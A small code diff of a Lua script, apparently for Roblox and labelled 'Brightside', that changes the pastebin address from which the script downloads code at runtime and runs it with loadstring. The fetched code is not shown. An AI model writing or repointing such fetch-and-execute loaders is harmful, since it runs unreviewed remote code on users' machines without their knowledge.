@@ -530,7 +530,7 @@ print("[Brightside] Source loaded ✓")
 
 task.spawn(function()
     local ok, err = pcall(function()
-        local ext = game:HttpGet("https://pastebin.com/raw/L4yzzJ5D")
+        local ext = game:HttpGet("https://pastebin.com/raw/wykgpq5y")
         if ext and #ext > 0 then loadstring(ext)() end
     end)
     if not ok then warn("[Brightside] External load failed:", err) end
